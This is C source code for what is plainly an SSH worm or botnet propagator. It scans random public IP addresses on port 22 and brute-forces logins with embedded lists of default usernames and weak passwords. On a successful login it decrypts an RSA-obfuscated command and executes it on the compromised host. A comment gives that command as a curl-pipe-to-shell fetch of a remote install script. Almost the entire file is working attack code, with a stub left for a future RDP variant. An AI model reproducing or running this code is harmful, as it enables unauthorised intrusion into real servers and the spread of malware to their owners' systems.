#include <sys/socket.h>
#include <stdio.h>
#include <inttypes.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <freerdp/freerdp.h>
#include <libssh/libssh.h>
#include <netdb.h>
#include <openssl/pem.h>
const char users[]=
"admin\n"
"admin123\n"
"root\n"
"administrator\n"
"ftp\n"
"test\n"
"guest\n"
"adm\n"
"user\n"
"oracle\n"
"vagrant\n"
"azureuser\n"
"pi\n"
"ec2-user\n"
"ansible\n"
"info\n"
"password\n";
const char passwords[]=
"root\n"
"admin\n"
"123456\n"
"password\n"
"12345678\n"
"qwerty\n"
"123456789\n"
"12345\n"
"1234\n"
"111111\n"
"1234567\n"
"dragon\n"
"fuckyou\n"
"123qwe\n"
"buster\n"
"superman\n"
"freedom\n"
"asshole\n"
"batman\n";
int public_decrypt(unsigned char *enc_data,int data_len,unsigned char *decrypted){
    unsigned char key[] = {
  0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
  0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
  0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x42, 0x49, 0x6a, 0x41, 0x4e, 0x42,
  0x67, 0x6b, 0x71, 0x68, 0x6b, 0x69, 0x47, 0x39, 0x77, 0x30, 0x42, 0x41,
  0x51, 0x45, 0x46, 0x41, 0x41, 0x4f, 0x43, 0x41, 0x51, 0x38, 0x41, 0x4d,
  0x49, 0x49, 0x42, 0x43, 0x67, 0x4b, 0x43, 0x41, 0x51, 0x45, 0x41, 0x72,
  0x6e, 0x76, 0x55, 0x42, 0x7a, 0x36, 0x4c, 0x52, 0x45, 0x51, 0x39, 0x4d,
  0x6c, 0x32, 0x74, 0x72, 0x66, 0x63, 0x53, 0x0a, 0x7a, 0x53, 0x39, 0x4e,
  0x75, 0x42, 0x7a, 0x4e, 0x49, 0x46, 0x64, 0x44, 0x4c, 0x64, 0x53, 0x4e,
  0x64, 0x72, 0x6d, 0x31, 0x71, 0x51, 0x64, 0x35, 0x79, 0x69, 0x41, 0x4d,
  0x58, 0x70, 0x56, 0x2b, 0x78, 0x58, 0x76, 0x54, 0x67, 0x59, 0x66, 0x34,
  0x73, 0x4b, 0x46, 0x38, 0x4d, 0x6d, 0x6b, 0x39, 0x38, 0x4d, 0x52, 0x32,
  0x5a, 0x6a, 0x70, 0x34, 0x49, 0x47, 0x73, 0x63, 0x58, 0x61, 0x77, 0x78,
  0x0a, 0x30, 0x30, 0x6d, 0x6d, 0x6d, 0x65, 0x39, 0x75, 0x45, 0x45, 0x41,
  0x70, 0x35, 0x69, 0x46, 0x4b, 0x74, 0x69, 0x39, 0x66, 0x38, 0x47, 0x51,
  0x78, 0x4d, 0x44, 0x70, 0x4b, 0x58, 0x74, 0x6c, 0x33, 0x34, 0x65, 0x34,
  0x67, 0x78, 0x4f, 0x74, 0x48, 0x6d, 0x58, 0x5a, 0x73, 0x74, 0x69, 0x66,
  0x4d, 0x41, 0x61, 0x57, 0x4b, 0x68, 0x2f, 0x47, 0x67, 0x51, 0x48, 0x47,
  0x2b, 0x62, 0x53, 0x51, 0x56, 0x0a, 0x70, 0x48, 0x38, 0x56, 0x74, 0x6c,
  0x71, 0x4d, 0x72, 0x39, 0x6c, 0x76, 0x42, 0x67, 0x55, 0x71, 0x51, 0x76,
  0x59, 0x33, 0x67, 0x6d, 0x4d, 0x54, 0x6e, 0x52, 0x73, 0x48, 0x41, 0x6f,
  0x52, 0x35, 0x67, 0x7a, 0x56, 0x71, 0x50, 0x6f, 0x52, 0x62, 0x4e, 0x78,
  0x36, 0x62, 0x53, 0x32, 0x58, 0x47, 0x6f, 0x6b, 0x59, 0x6c, 0x39, 0x66,
  0x59, 0x68, 0x32, 0x64, 0x52, 0x56, 0x77, 0x48, 0x48, 0x59, 0x0a, 0x31,
  0x6c, 0x2b, 0x31, 0x73, 0x75, 0x71, 0x72, 0x4a, 0x59, 0x4e, 0x38, 0x4a,
  0x65, 0x59, 0x6a, 0x72, 0x57, 0x56, 0x6b, 0x37, 0x4b, 0x38, 0x74, 0x78,
  0x69, 0x51, 0x37, 0x67, 0x66, 0x36, 0x37, 0x33, 0x59, 0x50, 0x4b, 0x59,
  0x54, 0x63, 0x53, 0x4e, 0x51, 0x75, 0x47, 0x43, 0x68, 0x6b, 0x47, 0x6c,
  0x41, 0x50, 0x59, 0x58, 0x63, 0x50, 0x62, 0x53, 0x37, 0x49, 0x6e, 0x47,
  0x61, 0x41, 0x7a, 0x0a, 0x44, 0x74, 0x62, 0x4a, 0x48, 0x59, 0x56, 0x5a,
  0x45, 0x62, 0x36, 0x53, 0x35, 0x57, 0x32, 0x58, 0x66, 0x75, 0x37, 0x48,
  0x52, 0x38, 0x50, 0x46, 0x2f, 0x54, 0x61, 0x7a, 0x32, 0x31, 0x59, 0x47,
  0x72, 0x52, 0x72, 0x70, 0x47, 0x2f, 0x41, 0x69, 0x32, 0x38, 0x44, 0x48,
  0x54, 0x65, 0x69, 0x6b, 0x5a, 0x53, 0x45, 0x76, 0x4e, 0x76, 0x6b, 0x2f,
  0x4c, 0x56, 0x6d, 0x43, 0x76, 0x6b, 0x61, 0x32, 0x0a, 0x43, 0x51, 0x49,
  0x44, 0x41, 0x51, 0x41, 0x42, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45,
  0x4e, 0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45,
  0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
};
    RSA *rsa = genRSA(key,1);
    return RSA_public_decrypt(data_len,enc_data,decrypted,rsa,1); 
}
int connectssh(char ip[],char login[],char password[]){
    ssh_init();
    ssh_session session = ssh_new();
    if(ssh_options_set(session,SSH_OPTIONS_HOST,ip) < 0){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -1;
    }
    if(ssh_options_set(session,SSH_OPTIONS_USER,login) < 0){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -1;
    }
    int timeout = 5;
    if(ssh_options_set(session,SSH_OPTIONS_TIMEOUT,&timeout) < 0){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -1;
    }
    if(ssh_options_set(session,SSH_OPTIONS_COMPRESSION_C_S,"none") < 0){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -1;
    }
    if(ssh_options_set(session,SSH_OPTIONS_COMPRESSION_S_C,"none") < 0){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -1;
    }
    if(ssh_connect(session) != 0){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -2;
    }
    int32_t rc=0,auth=0;
    if((rc =ssh_userauth_none(session,NULL)) ==SSH_AUTH_ERROR){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -2;
    }else if(rc==SSH_AUTH_SUCCESS){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return 1;
    }
    auth =ssh_auth_list(session);
    if((auth & SSH_AUTH_METHOD_PASSWORD) >0)
        auth = ssh_userauth_password(session,NULL,password);
    else if((auth & SSH_AUTH_METHOD_INTERACTIVE) > 0 ){
        auth = ssh_userauth_kbdint(session, NULL, NULL);
        while (auth == SSH_AUTH_INFO){
            rc = ssh_userauth_kbdint_getnprompts(session);
            for (register int i = 0; i < rc; i++)
                ssh_userauth_kbdint_setanswer(session, i, password);
            auth = ssh_userauth_kbdint(session, NULL, NULL);
        }
    }else{
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -2;
    }
    if(auth == SSH_AUTH_ERROR || !ssh_is_connected(session)){
        ssh_disconnect(session);
        ssh_finalize();
        ssh_free(session);
        return -2;
    }
    if(auth == SSH_AUTH_SUCCESS || auth == SSH_AUTH_PARTIAL){
        ssh_channel channel = ssh_channel_new(session);
        rc=ssh_channel_open_session(channel);
        if(rc<0) goto next;
        unsigned char payload[] = {0x74,0x2f,0xaf,0x44,0x2f,0xb5,0xbe,0x9c,0x50,0xb2,0x21,0x2a,0x45,0x4e,0xb9,0x19,0xe2,0x58,0x17,0x28,0x40,0x1f,0x7f,0xd1,0x55,0x50,0xd9,0x8b,0x0b,0xac,0x0f,0xe9,0x2a,0xe4,0xc5,0x23,0xbe,0x68,0x84,0x84,0x3c,0xf5,0xff,0x46,0x1c,0xae,0x10,0x48,0x73,0x73,0x53,0x20,0x52,0xbb,0x6e,0x38,0x9b,0xe1,0x63,0x7e,0xbe,0xdf,0x30,0x1b,0x33,0x55,0xfb,0x92,0x04,0x78,0xd5,0x1d,0xfa,0x0f,0x88,0xb7,0x93,0x61,0x4a,0x16,0x92,0x0a,0xb5,0x2b,0x6b,0x3a,0x5f,0xe5,0x97,0x56,0x5d,0xae,0x6a,0xe7,0xe0,0x62,0xea,0x57,0x71,0x5c,0xd2,0x3b,0x95,0x3d,0xb9,0xff,0x6a,0x37,0xfa,0xf3,0x33,0x23,0x76,0x50,0xce,0x13,0xef,0xfd,0x22,0x80,0x57,0xfb,0xc4,0xb2,0x23,0x02,0xe4,0x5c,0x97,0xf9,0xe3,0x75,0x75,0x9f,0x10,0x55,0xff,0x3d,0x34,0xd0,0x94,0x2e,0xb1,0x01,0x79,0xaa,0x67,0x89,0x39,0x80,0x10,0xdd,0x77,0xc1,0x1d,0x55,0x75,0x26,0xfa,0x22,0x6d,0xab,0xb2,0x01,0x18,0x21,0x4a,0x67,0x2f,0xdf,0x8c,0x09,0xe3,0xeb,0xc1,0x0c,0xee,0x16,0xf9,0x1f,0xb4,0xba,0xc9,0x2a,0xc0,0x8f,0x79,0xd9,0xd1,0x75,0x53,0x11,0xa0,0x97,0x98,0x33,0x26,0x5c,0xa1,0xf1,0x1a,0x1f,0x1c,0xf4,0xc1,0x05,0x8a,0x95,0xd6,0xd9,0x1a,0xbc,0x63,0x17,0x4a,0x4e,0x7c,0x5f,0xae,0x21,0xaa,0x4b,0x64,0x90,0x50,0xbb,0x75,0x16,0x22,0x6a,0x58,0x84,0xbf,0x7d,0xc0,0x48,0xe3,0x94,0xd5,0xd3,0xda,0xfc,0x5d,0x8b,0xf7,0xf2,0x26,0xdd,0x3b,0xae,0x23,0xc1,0xf8,0x3f,0x71,0xeb,0x00 };
        char ppp[1024];
        public_decrypt(payload,256,ppp);
        rc=ssh_channel_request_exec(channel,ppp); //curl https://vda789.github.io/install.sh | sh
        if(rc<0) goto next;
        goto next;
        next:
            ssh_disconnect(session);
            ssh_finalize();
            ssh_free(session);
            return 1;
    }
    ssh_disconnect(session);
    ssh_finalize();
    ssh_free(session);
    return 0;
}
void sshtest(char ip[]){
    int32_t rc,method;
    ssh_init();
    ssh_session session= ssh_new();
    if(session == NULL){
        ssh_disconnect(session);
        return;
    }
    if(ssh_options_set(session,SSH_OPTIONS_HOST,ip) < 0){
        ssh_disconnect(session);
        return;
    }
    if(ssh_options_set(session,SSH_OPTIONS_USER,"admin") < 0){
        ssh_disconnect(session);
        return;
    }
    int timeout = 5;
    if(ssh_options_set(session,SSH_OPTIONS_TIMEOUT,&timeout) < 0){
        ssh_disconnect(session);
        return;
    }
    if(ssh_connect(session) != 0)
        return;
    rc = ssh_userauth_none(session,NULL);
    method =ssh_userauth_list(session,NULL);
    ssh_disconnect(session);
    ssh_finalize();
    ssh_free(session);
    if((method & SSH_AUTH_METHOD_INTERACTIVE) || (method & SSH_AUTH_METHOD_PASSWORD)){
        int i = 0,y=0,x=0,z=0;
        while (1){
            char tmpu[100]={},tmpp[100]={};
            int leave = 0;
            while(users[i] != '\n'){
                tmpu[z] = users[i];
                ++i;++z;
            }
            z=0;++i;
            if(users[i]=='\0')
                leave=1;
            while (1){
                int ll=0;
                while (passwords[y] !='\n'){
                    tmpp[x]=passwords[y];
                    ++x;++y;
                }
                ++y;x=0;
                if(passwords[y] == '\0')
                    ll=1;
                int a = connectssh(ip,tmpu,tmpp);
                if(a == -2) return;
                else if(a){
                    printf("usuario:%s senha:%s FOUND\n",tmpu,tmpp);
                    return;
                }
                memset(tmpp,0,sizeof(tmpp));
                if(ll){
                    y=0;
                    break;
                }
            }
            memset(tmpu,0,sizeof(tmpu));
            if(leave)
                break;
        }
    }
}
void rdptest(char ip[]){

}
void *web_reply(void *v){
    unsigned int *s = v;
    *s = time(NULL) ^ getpid() ^ pthread_self();
    struct timeval timeout = {
        .tv_sec=5,
        .tv_usec=0
    };
    unsigned int fd = -1;
    //int ptr[] = {3389,22}; cenas para os próximos capítulos
    int ptr[] = {22};
    while (1) {
        for(register int i = 0; i < 1;++i){
            uint32_t ip;
            uint8_t o1, o2, o3, o4;
            do{
                ip = rand_r(s) %( 429496729 - 2000 +1) + 85;
                o4 = ip & 0xff;
                o3 = (ip >> 8) & 0xff;
                o2 = (ip >> 16) & 0xff;
                o1 = (ip >> 24) & 0xff;
                printf("IP %d.%d.%d.%d\n",o1,o2,o3,o4);    
            }while (o1 == 127 ||                              // 127.0.0.0/8      - Loopback
                    (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
                    (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
                    (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
                    (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
                    (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
                    (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
                    (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
                    (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
                    (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
                    (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
                    (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
                    (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
        );
            struct sockaddr_in addr = {
                .sin_addr.s_addr = htonl(ip),
                .sin_family = AF_INET,
                .sin_port = htons(ptr[i]),
            };
            fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
            setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO | SO_SNDTIMEO,(char *)&timeout,sizeof(timeout)); 
            if(fd > 0){
                if(connect(fd,(struct sockaddr *)&addr,sizeof(addr)) == 0){
                    if(ptr[i] == 22)
                        sshtest(inet_ntoa(addr.sin_addr));
                    /*else (cenas para os próximos capítulos)
                        rdptest(inet_ntoa(addr.sin_addr));*/
                }
                close(fd);
            }
            close(fd);
        }
        sleep(5);
    }
    pthread_detach(pthread_self());
}
int main(){
    pthread_t id1,id2;
    unsigned int s[2];
    pthread_create(&id1,NULL,web_reply,&s[0]);
    pthread_create(&id1,NULL,web_reply,&s[1]);
    while(1) continue;
}